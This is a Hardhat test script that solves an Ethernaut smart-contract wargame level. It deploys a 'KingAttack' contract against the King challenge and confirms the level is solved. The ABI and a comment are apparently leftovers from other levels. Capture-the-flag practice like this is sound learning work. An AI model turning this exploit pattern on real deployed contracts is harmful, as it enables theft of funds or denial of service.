const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  {
    inputs: [
      {
        internalType: "bytes32",
        name: "_password",
        type: "bytes32",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "locked",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes32",
        name: "_password",
        type: "bytes32",
      },
    ],
    name: "unlock",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const contractLevel = "0x27bC920e7C426500a0e7D63Bb037800A7288abC1";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(
    contractLevel,
    ethers.utils.parseUnits("0.001", "ether"),
    "KingFactory"
  );
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  // Deploy attack contract
  // Call attack
  let attackFactory = await ethers.getContractFactory("KingAttack");
  let attackContract = await attackFactory.deploy(challenge.address);
  await attackContract.deployed();
  let tx = await attackContract.attack({
    value: ethers.utils.parseUnits("0.01", "ether"),
  });
  await tx.wait(1);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
